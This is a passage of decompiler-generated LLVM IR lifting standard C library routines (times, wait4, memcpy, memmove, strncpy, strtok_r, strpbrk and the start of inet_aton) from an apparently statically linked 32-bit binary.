  store i32 %v1_804bdc4, i32* %v2_804bdc6, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804bdcd

dec_label_pc_804bdcd:                             ; preds = %dec_label_pc_804bdbf, %dec_label_pc_804bda6, %dec_label_pc_804bd96
  %storemerge = phi i32 [ -1, %dec_label_pc_804bd96 ], [ %v7_804bdb3, %dec_label_pc_804bda6 ], [ -1, %dec_label_pc_804bdbf ]
  %v2_804bdcd = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804bdcd, i32* @edx, align 4
  store i32 %v0_804bd7d, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_804bdb3, { 1, 0, 2 }
  uselistorder i32 %v0_804bdab, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804bdd4 = load i32, i32* @edi, align 4
  store i32 %v0_804bdd4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804bddc = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804bde4 = call i32 @times(i32 %v0_804bddc)
  store i32 %v1_804bde4, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804bde4, -4095
  br i1 %tmp, label %dec_label_pc_804bdfc, label %dec_label_pc_804bdf0

dec_label_pc_804bdf0:                             ; preds = %entry
  %v1_804bdf0 = call i32 @__errno_location(i32 %v0_804bddc)
  %v0_804bdf5 = load i32, i32* %edi.global-to-local, align 4
  %v1_804bdf5 = sub i32 0, %v0_804bdf5
  %v2_804bdf7 = inttoptr i32 %v1_804bdf0 to i32*
  store i32 %v1_804bdf5, i32* %v2_804bdf7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804bdfc

dec_label_pc_804bdfc:                             ; preds = %entry, %dec_label_pc_804bdf0
  %v0_804bdfd = phi i32 [ %v1_804bde4, %entry ], [ -1, %dec_label_pc_804bdf0 ]
  %v2_804be00 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804be00, i32* @edi, align 4
  ret i32 %v0_804bdfd

; uselistorder directives
  uselistorder i32 %v1_804bde4, { 1, 0, 2 }
  uselistorder i32 (i32)* @times, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804bdfc, { 1, 0 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804be04 = load i32, i32* @edi, align 4
  %v0_804be05 = load i32, i32* @esi, align 4
  store i32 %v0_804be05, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_804be19 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_804be21 = call i32 @wait4(i32 %v0_804be19, i32 %v0_804be05, i32 %v0_804be04, i32 %tmp5)
  store i32 %v0_804be19, i32* @ebx, align 4
  store i32 %v4_804be21, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804be21, -4095
  br i1 %tmp, label %dec_label_pc_804be39, label %dec_label_pc_804be2d

dec_label_pc_804be2d:                             ; preds = %entry
  %v1_804be2d = call i32 @__errno_location(i32 %v0_804be19)
  %v0_804be32 = load i32, i32* %esi.global-to-local, align 4
  %v1_804be32 = sub i32 0, %v0_804be32
  %v2_804be34 = inttoptr i32 %v1_804be2d to i32*
  store i32 %v1_804be32, i32* %v2_804be34, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804be39

dec_label_pc_804be39:                             ; preds = %entry, %dec_label_pc_804be2d
  %v0_804be3a = phi i32 [ %v4_804be21, %entry ], [ -1, %dec_label_pc_804be2d ]
  %v2_804be3c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804be3c, i32* @esi, align 4
  store i32 %v0_804be04, i32* @edi, align 4
  ret i32 %v0_804be3a

; uselistorder directives
  uselistorder i32 %v4_804be21, { 1, 0, 2 }
  uselistorder i32 %v0_804be19, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 1, 0 }
  uselistorder label %dec_label_pc_804be39, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_8052524.83 to i32)
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804be49 = load i32, i32* @esi, align 4
  store i32 %v0_804be49, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_804be4a = sdiv i32 %sext, 16777216
  store i32 %v4_804be4a, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804be52 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804be52, i32* %edi.global-to-local, align 4
  %v2_804be58 = udiv i32 %v4_804be4a, 4
  %v3_804be5b = inttoptr i32 %arg2 to i8*
  %v4_804be5b = bitcast i16* %arg1 to i8*
  %v5_804be5b = call i8* @_memcpy(i8* %v4_804be5b, i8* %v3_804be5b, i32 %v2_804be58)
  %v6_804be5b = ptrtoint i8* %v5_804be5b to i32
  store i32 %v6_804be5b, i32* @ecx, align 4
  %v0_804be5d = load i32, i32* %eax.global-to-local, align 4
  %v2_804be5d = and i32 %v0_804be5d, 2
  %v3_804be5d = icmp eq i32 %v2_804be5d, 0
  br i1 %v3_804be5d, label %dec_label_pc_804be63, label %dec_label_pc_804be61

dec_label_pc_804be61:                             ; preds = %entry
  %v0_804be61 = load i32, i32* %esi.global-to-local, align 4
  %v1_804be61 = inttoptr i32 %v0_804be61 to i16*
  %v2_804be61 = load i16, i16* %v1_804be61, align 2
  %v3_804be61 = load i32, i32* %edi.global-to-local, align 4
  %v4_804be61 = inttoptr i32 %v3_804be61 to i16*
  store i16 %v2_804be61, i16* %v4_804be61, align 2
  %v5_804be61 = load i32, i32* %edi.global-to-local, align 4
  %v6_804be61 = load i32, i32* %esi.global-to-local, align 4
  %v7_804be61 = load i1, i1* @df, align 1
  %v8_804be61 = select i1 %v7_804be61, i32 -2, i32 2
  %v9_804be61 = add i32 %v8_804be61, %v5_804be61
  %v10_804be61 = add i32 %v8_804be61, %v6_804be61
  store i32 %v9_804be61, i32* %edi.global-to-local, align 4
  store i32 %v10_804be61, i32* %esi.global-to-local, align 4
  %v0_804be63.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804be63

dec_label_pc_804be63:                             ; preds = %entry, %dec_label_pc_804be61
  %v0_804be63 = phi i32 [ %v0_804be5d, %entry ], [ %v0_804be63.pre, %dec_label_pc_804be61 ]
  %v2_804be63 = urem i32 %v0_804be63, 2
  %v3_804be63 = icmp eq i32 %v2_804be63, 0
  br i1 %v3_804be63, label %dec_label_pc_804be68, label %dec_label_pc_804be67

dec_label_pc_804be67:                             ; preds = %dec_label_pc_804be63
  %v0_804be67 = load i32, i32* %esi.global-to-local, align 4
  %v1_804be67 = inttoptr i32 %v0_804be67 to i8*
  %v2_804be67 = load i8, i8* %v1_804be67, align 1
  %v3_804be67 = load i32, i32* %edi.global-to-local, align 4
  %v4_804be67 = inttoptr i32 %v3_804be67 to i8*
  store i8 %v2_804be67, i8* %v4_804be67, align 1
  %v5_804be67 = load i32, i32* %edi.global-to-local, align 4
  %v6_804be67 = load i32, i32* %esi.global-to-local, align 4
  %v7_804be67 = load i1, i1* @df, align 1
  %v8_804be67 = select i1 %v7_804be67, i32 -1, i32 1
  %v9_804be67 = add i32 %v8_804be67, %v5_804be67
  %v10_804be67 = add i32 %v8_804be67, %v6_804be67
  store i32 %v9_804be67, i32* %edi.global-to-local, align 4
  store i32 %v10_804be67, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804be68

dec_label_pc_804be68:                             ; preds = %dec_label_pc_804be63, %dec_label_pc_804be67
  store i32 %v4_804be52, i32* %eax.global-to-local, align 4
  %v2_804be6c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804be6c, i32* @esi, align 4
  ret i32 %v4_804be52

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_804be68, { 1, 0 }
  uselistorder label %dec_label_pc_804be63, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_804be71 = load i32, i32* @esi, align 4
  store i32 %v0_804be71, i32* %stack_var_-8, align 4
  %v4_804be72 = ptrtoint i8* %arg1 to i32
  %v9_804be7e = icmp ugt i8* %tmp3, %arg1
  %v1_804be80 = icmp eq i1 %v9_804be7e, false
  br i1 %v1_804be80, label %dec_label_pc_804be88, label %dec_label_pc_804be82

dec_label_pc_804be82:                             ; preds = %entry
  %v7_804be84 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  br label %dec_label_pc_804be94

dec_label_pc_804be88:                             ; preds = %entry
  %v3_804be88 = add i32 %arg2, -1
  %v4_804be88 = add i32 %v3_804be88, %tmp
  %v5_804be88 = inttoptr i32 %v4_804be88 to i8*
  %v3_804be8c = add i32 %v4_804be72, -1
  %v4_804be8c = add i32 %v3_804be8c, %tmp
  %v5_804be8c = inttoptr i32 %v4_804be8c to i8*
  %v7_804be91 = call i8* @_memcpy(i8* %v5_804be8c, i8* %v5_804be88, i32 %tmp)
  br label %dec_label_pc_804be94

dec_label_pc_804be94:                             ; preds = %dec_label_pc_804be82, %dec_label_pc_804be88
  %v2_804be94 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804be94, i32* @esi, align 4
  ret i32 %v4_804be72

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 1, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804be94, { 1, 0 }
}

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804be99 = load i32, i32* @esi, align 4
  store i32 %v0_804be99, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804bea5 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804bea5, i32* %edi.global-to-local, align 4
  %v1_804bea9 = add i32 %arg3, 1
  store i32 %v1_804bea9, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804beaa

dec_label_pc_804beaa:                             ; preds = %dec_label_pc_804bead, %entry
  %v3_804beae = phi i32 [ %v4_804bea5, %entry ], [ %v8_804beae, %dec_label_pc_804bead ]
  %v0_804beaa = phi i32 [ %v1_804bea9, %entry ], [ %v0_804beaa.pre, %dec_label_pc_804bead ]
  %v1_804beaa = add i32 %v0_804beaa, -1
  %v8_804beaa = icmp eq i32 %v1_804beaa, 0
  store i32 %v1_804beaa, i32* %ecx.global-to-local, align 4
  br i1 %v8_804beaa, label %.loopexit, label %dec_label_pc_804bead

dec_label_pc_804bead:                             ; preds = %dec_label_pc_804beaa
  %v0_804bead = load i32, i32* %esi.global-to-local, align 4
  %v1_804bead = inttoptr i32 %v0_804bead to i8*
  %v2_804bead = load i8, i8* %v1_804bead, align 1
  %v10_804bead = load i1, i1* @df, align 1
  %v11_804bead = select i1 %v10_804bead, i32 -1, i32 1
  %v12_804bead = add i32 %v11_804bead, %v0_804bead
  store i32 %v12_804bead, i32* %esi.global-to-local, align 4
  %v4_804beae = inttoptr i32 %v3_804beae to i8*
  store i8 %v2_804bead, i8* %v4_804beae, align 1
  %v5_804beae = load i32, i32* %edi.global-to-local, align 4
  %v6_804beae = load i1, i1* @df, align 1
  %v7_804beae = select i1 %v6_804beae, i32 -1, i32 1
  %v8_804beae = add i32 %v7_804beae, %v5_804beae
  store i32 %v8_804beae, i32* %edi.global-to-local, align 4
  %v6_804beaf = icmp eq i8 %v2_804bead, 0
  %v1_804beb1 = icmp eq i1 %v6_804beaf, false
  %v0_804beaa.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_804beb1, label %dec_label_pc_804beaa, label %dec_label_pc_804beb3

dec_label_pc_804beb3:                             ; preds = %dec_label_pc_804bead
  %v1_804beb3 = add i32 %v0_804beaa.pre, -1
  store i32 %v1_804beb3, i32* %ecx.global-to-local, align 4
  %v2_804beb4 = sext i8 %v2_804bead to i32
  %v4_804beb4 = inttoptr i32 %v8_804beae to i8*
  %v5_804beb4 = call i8* @_memset(i8* %v4_804beb4, i32 %v2_804beb4, i32 %v1_804beb3)
  %v6_804beb4 = ptrtoint i8* %v5_804beb4 to i32
  store i32 %v6_804beb4, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_804beaa, %dec_label_pc_804beb3
  %v2_804beba = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804beba, i32* @edx, align 4
  %v2_804bebb = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804bebb, i32* @esi, align 4
  ret i32 %v4_804bea5

; uselistorder directives
  uselistorder i32 %v8_804beae, { 0, 2, 1 }
  uselistorder i8 %v2_804bead, { 0, 2, 1 }
  uselistorder i32 %v1_804beaa, { 1, 0 }
  uselistorder i32 %v4_804bea5, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804bec0 = load i32, i32* @edi, align 4
  %v0_804bec1 = load i32, i32* @esi, align 4
  %v0_804bec2 = load i32, i32* @ebx, align 4
  store i32 %v0_804bec2, i32* %stack_var_-12, align 4
  %v4_804bec3 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804bec3, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_804becf = icmp eq i8* %arg1, null
  %v1_804bed1 = icmp eq i1 %v1_804becf, false
  br i1 %v1_804bed1, label %dec_label_pc_804bed5, label %dec_label_pc_804bed3

dec_label_pc_804bed3:                             ; preds = %entry
  %v1_804bed3 = inttoptr i32 %arg3 to i32*
  %v2_804bed3 = load i32, i32* %v1_804bed3, align 4
  store i32 %v2_804bed3, i32* @ebx, align 4
  br label %dec_label_pc_804bed5

dec_label_pc_804bed5:                             ; preds = %entry, %dec_label_pc_804bed3
  %v0_804bed8 = phi i32 [ %v4_804bec3, %entry ], [ %v2_804bed3, %dec_label_pc_804bed3 ]
  %v0_804bed5 = load i32, i32* @ecx, align 4
  %v5_804bed8 = inttoptr i32 %v0_804bed8 to i8*
  %v8_804bed9 = call i32 @__GI_strspn(i8* %v5_804bed8, i32 %arg2, i32 %v0_804bed5, i32 %v0_804bed5)
  store i32 %v8_804bed9, i32* %eax.global-to-local, align 4
  %v0_804bee1 = load i32, i32* @ebx, align 4
  %v2_804bee1 = add i32 %v0_804bee1, %v8_804bed9
  store i32 %v2_804bee1, i32* @ebx, align 4
  %v1_804bee3 = inttoptr i32 %v2_804bee1 to i8*
  %v2_804bee3 = load i8, i8* %v1_804bee3, align 1
  %v3_804bee3 = icmp eq i8 %v2_804bee3, 0
  %v1_804bee6 = icmp eq i1 %v3_804bee3, false
  br i1 %v1_804bee6, label %dec_label_pc_804beee, label %dec_label_pc_804bee8

dec_label_pc_804bee8:                             ; preds = %dec_label_pc_804bed5
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804beea = load i32, i32* @esi, align 4
  %v2_804beea = inttoptr i32 %v1_804beea to i32*
  store i32 %v2_804bee1, i32* %v2_804beea, align 4
  %v0_804bf18.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bf15

dec_label_pc_804beee:                             ; preds = %dec_label_pc_804bed5
  %v0_804beee = load i32, i32* @edx, align 4
  %v0_804bef0 = load i32, i32* @edi, align 4
  %v8_804bef2 = call i32 @__GI_strpbrk(i8* %v1_804bee3, i32 %v0_804bef0, i32 %v0_804beee, i32 %v0_804beee)
  store i32 %v8_804bef2, i32* %eax.global-to-local, align 4
  %v2_804befa = icmp eq i32 %v8_804bef2, 0
  %v1_804befc = icmp eq i1 %v2_804befa, false
  br i1 %v1_804befc, label %dec_label_pc_804bf0d, label %dec_label_pc_804befe

dec_label_pc_804befe:                             ; preds = %dec_label_pc_804beee
  %v0_804bf02 = load i32, i32* @ebx, align 4
  %v5_804bf02 = inttoptr i32 %v0_804bf02 to i8*
  %v8_804bf03 = call i32 @rawmemchr(i8* %v5_804bf02, i32 0, i32 %v8_804bef2, i32 %v8_804bef2)
  br label %dec_label_pc_804bf11

dec_label_pc_804bf0d:                             ; preds = %dec_label_pc_804beee
  %v9_804bef2 = inttoptr i32 %v8_804bef2 to i8*
  store i8 0, i8* %v9_804bef2, align 1
  %v2_804bf10 = add i32 %v8_804bef2, 1
  br label %dec_label_pc_804bf11

dec_label_pc_804bf11:                             ; preds = %dec_label_pc_804befe, %dec_label_pc_804bf0d
  %storemerge = phi i32 [ %v2_804bf10, %dec_label_pc_804bf0d ], [ %v8_804bf03, %dec_label_pc_804befe ]
  %v0_804bf11 = phi i32 [ %v2_804bf10, %dec_label_pc_804bf0d ], [ %v8_804bf03, %dec_label_pc_804befe ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_804bf11 = load i32, i32* @esi, align 4
  %v2_804bf11 = inttoptr i32 %v1_804bf11 to i32*
  store i32 %v0_804bf11, i32* %v2_804bf11, align 4
  %v0_804bf13 = load i32, i32* @ebx, align 4
  store i32 %v0_804bf13, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bf15

dec_label_pc_804bf15:                             ; preds = %dec_label_pc_804bee8, %dec_label_pc_804bf11
  %v0_804bf18 = phi i32 [ %v0_804bf18.pre, %dec_label_pc_804bee8 ], [ %v0_804bf13, %dec_label_pc_804bf11 ]
  %v2_804bf15 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804bf15, i32* @ebx, align 4
  store i32 %v0_804bec1, i32* @esi, align 4
  store i32 %v0_804bec0, i32* @edi, align 4
  ret i32 %v0_804bf18

; uselistorder directives
  uselistorder i32 %v8_804bef2, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804bf15, { 1, 0 }
  uselistorder label %dec_label_pc_804bf11, { 1, 0 }
  uselistorder label %dec_label_pc_804bed5, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804bf1d = load i32, i32* @ebx, align 4
  %v2_804bf3425 = load i8, i8* %arg1, align 1
  %v4_804bf3629 = icmp eq i8 %v2_804bf3425, 0
  br i1 %v4_804bf3629, label %dec_label_pc_804bf3e, label %dec_label_pc_804bf3a.lr.ph

dec_label_pc_804bf3a.lr.ph:                       ; preds = %entry
  %v3_804bf3426 = zext i8 %v2_804bf3425 to i32
  %v5_804bf3427 = and i32 %v0_804bf1d, -256
  %v6_804bf3428 = or i32 %v3_804bf3426, %v5_804bf3427
  %v4_804bf22 = ptrtoint i8* %arg1 to i32
  %v1_804bf2d13 = inttoptr i32 %arg2 to i8*
  %v4_804bf2d.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804bf3a

dec_label_pc_804bf28:                             ; preds = %dec_label_pc_804bf3a, %dec_label_pc_804bf2c
  %v6_804bf2d23 = phi i32 [ %v6_804bf2d, %dec_label_pc_804bf2c ], [ %v6_804bf2d17, %dec_label_pc_804bf3a ]
  %v2_804bf2d22 = phi i8 [ %v2_804bf2d, %dec_label_pc_804bf2c ], [ %v2_804bf2d14, %dec_label_pc_804bf3a ]
  %v0_804bf2c21 = phi i32 [ %v1_804bf2c, %dec_label_pc_804bf2c ], [ %arg2, %dec_label_pc_804bf3a ]
  %v15_804bf28 = icmp eq i8 %v2_804bf2d22, %v2_804bf3433
  br i1 %v15_804bf28, label %dec_label_pc_804bf40, label %dec_label_pc_804bf2c

dec_label_pc_804bf2c:                             ; preds = %dec_label_pc_804bf28
  %v1_804bf2c = add i32 %v0_804bf2c21, 1
  store i32 %v1_804bf2c, i32* @edx, align 4
  %v1_804bf2d = inttoptr i32 %v1_804bf2c to i8*
  %v2_804bf2d = load i8, i8* %v1_804bf2d, align 1
  %v3_804bf2d = zext i8 %v2_804bf2d to i32
  %v5_804bf2d = and i32 %v6_804bf2d23, -256
  %v6_804bf2d = or i32 %v3_804bf2d, %v5_804bf2d
  store i32 %v6_804bf2d, i32* @ecx, align 4
  %v4_804bf2f = icmp eq i8 %v2_804bf2d, 0
  %v1_804bf31 = icmp eq i1 %v4_804bf2f, false
  br i1 %v1_804bf31, label %dec_label_pc_804bf28, label %dec_label_pc_804bf33

dec_label_pc_804bf33:                             ; preds = %dec_label_pc_804bf2c, %dec_label_pc_804bf3a
  %v4_804bf2d.pre36 = phi i32 [ %v6_804bf2d17, %dec_label_pc_804bf3a ], [ %v6_804bf2d, %dec_label_pc_804bf2c ]
  %v1_804bf33 = add i32 %v0_804bf3331, 1
  %v1_804bf34 = inttoptr i32 %v1_804bf33 to i8*
  %v2_804bf34 = load i8, i8* %v1_804bf34, align 1
  %v3_804bf34 = zext i8 %v2_804bf34 to i32
  %v5_804bf34 = and i32 %v6_804bf3434, -256
  %v6_804bf34 = or i32 %v3_804bf34, %v5_804bf34
  %v4_804bf36 = icmp eq i8 %v2_804bf34, 0
  br i1 %v4_804bf36, label %dec_label_pc_804bf3e, label %dec_label_pc_804bf3a

dec_label_pc_804bf3a:                             ; preds = %dec_label_pc_804bf3a.lr.ph, %dec_label_pc_804bf33
  %v4_804bf2d.pre = phi i32 [ %v4_804bf2d.pre.pre, %dec_label_pc_804bf3a.lr.ph ], [ %v4_804bf2d.pre36, %dec_label_pc_804bf33 ]
  %v6_804bf3434 = phi i32 [ %v6_804bf3428, %dec_label_pc_804bf3a.lr.ph ], [ %v6_804bf34, %dec_label_pc_804bf33 ]
  %v2_804bf3433 = phi i8 [ %v2_804bf3425, %dec_label_pc_804bf3a.lr.ph ], [ %v2_804bf34, %dec_label_pc_804bf33 ]
  %v0_804bf3331 = phi i32 [ %v4_804bf22, %dec_label_pc_804bf3a.lr.ph ], [ %v1_804bf33, %dec_label_pc_804bf33 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_804bf2d14 = load i8, i8* %v1_804bf2d13, align 1
  %v3_804bf2d15 = zext i8 %v2_804bf2d14 to i32
  %v5_804bf2d16 = and i32 %v4_804bf2d.pre, -256
  %v6_804bf2d17 = or i32 %v3_804bf2d15, %v5_804bf2d16
  store i32 %v6_804bf2d17, i32* @ecx, align 4
  %v4_804bf2f18 = icmp eq i8 %v2_804bf2d14, 0
  %v1_804bf3120 = icmp eq i1 %v4_804bf2f18, false
  br i1 %v1_804bf3120, label %dec_label_pc_804bf28, label %dec_label_pc_804bf33

dec_label_pc_804bf3e:                             ; preds = %dec_label_pc_804bf33, %entry
  br label %dec_label_pc_804bf40

dec_label_pc_804bf40:                             ; preds = %dec_label_pc_804bf28, %dec_label_pc_804bf3e
  %v0_804bf42 = phi i32 [ 0, %dec_label_pc_804bf3e ], [ %v0_804bf3331, %dec_label_pc_804bf28 ]
  store i32 %v0_804bf1d, i32* @ebx, align 4
  ret i32 %v0_804bf42

; uselistorder directives
  uselistorder i32 %v6_804bf2d17, { 2, 0, 1 }
  uselistorder i8 %v2_804bf2d14, { 1, 2, 0 }
  uselistorder i32 %v1_804bf33, { 1, 0 }
  uselistorder i32 %v6_804bf2d, { 1, 2, 0 }
  uselistorder i8 %v2_804bf2d, { 1, 2, 0 }
  uselistorder i32 %v1_804bf2c, { 2, 1, 0 }
  uselistorder i8 %v2_804bf3425, { 0, 2, 1 }
  uselistorder i32 %v0_804bf1d, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804bf40, { 1, 0 }
  uselistorder label %dec_label_pc_804bf3a, { 1, 0 }
  uselistorder label %dec_label_pc_804bf33, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804bf4b = ptrtoint i8* %arg1 to i32
  store i32 %v4_804bf4b, i32* @ecx, align 4
  %v1_804bf4f = icmp eq i8* %arg1, null
  br i1 %v1_804bf4f, label %dec_label_pc_804bfd0, label %dec_label_pc_804bf53

dec_label_pc_804bf53:                             ; preds = %entry
  %v0_804bf5e.pre = load i32, i32* @global_var_8052038, align 8
  br label %dec_label_pc_804bf5e

dec_label_pc_804bf5e:                             ; preds = %dec_label_pc_804bf53, %dec_label_pc_804bfa7
  %v2_804bfa734 = phi i32 [ 1, %dec_label_pc_804bf53 ], [ %v3_804bfa7, %dec_label_pc_804bfa7 ]
  %v0_804bf6433 = phi i32 [ %v4_804bf4b, %dec_label_pc_804bf53 ], [ %v0_804bf643, %dec_label_pc_804bfa7 ]
  %v0_804bfc532 = phi i32 [ 0, %dec_label_pc_804bf53 ], [ %v2_804bfad, %dec_label_pc_804bfa7 ]
  %v1_804bf64 = inttoptr i32 %v0_804bf6433 to i8*
  %v2_804bf64 = load i8, i8* %v1_804bf64, align 1
  %v3_804bf64 = sext i8 %v2_804bf64 to i32
  %v2_804bf67 = mul nsw i32 %v3_804bf64, 2
  %v3_804bf67 = add i32 %v2_804bf67, %v0_804bf5e.pre
  %v4_804bf67 = inttoptr i32 %v3_804bf67 to i8*
  %v5_804bf67 = load i8, i8* %v4_804bf67, align 1
  %v6_804bf67 = and i8 %v5_804bf67, 8
  %v7_804bf67 = icmp eq i8 %v6_804bf67, 0
  br i1 %v7_804bf67, label %dec_label_pc_804bfd0, label %dec_label_pc_804bf6e

dec_label_pc_804bf6e:                             ; preds = %dec_label_pc_804bf5e
  %v4_804bf82.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804bf82

dec_label_pc_804bf72:                             ; preds = %dec_label_pc_804bf82
  %v3_804bf72 = mul i32 %v1_804bf72, 10
  %v2_804bf75 = add i32 %v3_804bf72, -48
  %v3_804bf75 = add i32 %v2_804bf75, %v2_804bf84
  %v1_804bf79 = add i32 %v3_804bf75, -255
  %v6_804bf79 = sub i32 254, %v3_804bf75
  %v7_804bf79 = and i32 %v6_804bf79, %v3_804bf75
  %v8_804bf79 = icmp slt i32 %v7_804bf79, 0
  %v9_804bf79 = icmp eq i32 %v1_804bf79, 0
  %v10_804bf79 = icmp slt i32 %v1_804bf79, 0
  %v3_804bf7f = icmp eq i1 %v10_804bf79, %v8_804bf79
  %v4_804bf7f = icmp eq i1 %v9_804bf79, false
  %v5_804bf7f = and i1 %v4_804bf7f, %v3_804bf7f
  br i1 %v5_804bf7f, label %dec_label_pc_804bfd0, label %dec_label_pc_804bf81

dec_label_pc_804bf81:                             ; preds = %dec_label_pc_804bf72
  %v1_804bf81 = add i32 %v0_804bf81, 1
  store i32 %v1_804bf81, i32* @ecx, align 4
  br label %dec_label_pc_804bf82

dec_label_pc_804bf82:                             ; preds = %dec_label_pc_804bf6e, %dec_label_pc_804bf81
  %v1_804bf72 = phi i32 [ 0, %dec_label_pc_804bf6e ], [ %v3_804bf75, %dec_label_pc_804bf81 ]
  %v4_804bf82 = phi i32 [ %v4_804bf82.pre, %dec_label_pc_804bf6e ], [ %v6_804bf82, %dec_label_pc_804bf81 ]
  %v0_804bf81 = phi i32 [ %v0_804bf6433, %dec_label_pc_804bf6e ], [ %v1_804bf81, %dec_label_pc_804bf81 ]
  %v1_804bf82 = inttoptr i32 %v0_804bf81 to i8*
  %v2_804bf82 = load i8, i8* %v1_804bf82, align 1
  %v3_804bf82 = zext i8 %v2_804bf82 to i32
  %v5_804bf82 = and i32 %v4_804bf82, -256
  %v6_804bf82 = or i32 %v3_804bf82, %v5_804bf82
  store i32 %v6_804bf82, i32* @edx, align 4
  %v2_804bf84 = sext i8 %v2_804bf82 to i32
  %v2_804bf87 = mul nsw i32 %v2_804bf84, 2
  %v3_804bf87 = add i32 %v2_804bf87, %v0_804bf5e.pre
  %v4_804bf87 = inttoptr i32 %v3_804bf87 to i16*
  %v5_804bf87 = load i16, i16* %v4_804bf87, align 2
  %v2_804bf8c = and i16 %v5_804bf87, 8
  %v3_804bf8c = icmp eq i16 %v2_804bf8c, 0
  %v1_804bf8e = icmp eq i1 %v3_804bf8c, false
  br i1 %v1_804bf8e, label %dec_label_pc_804bf72, label %dec_label_pc_804bf90

dec_label_pc_804bf90:                             ; preds = %dec_label_pc_804bf82
  %v8_804bf90 = sub nsw i32 2, %v2_804bfa734
  %v9_804bf90 = and i32 %v8_804bf90, %v2_804bfa734
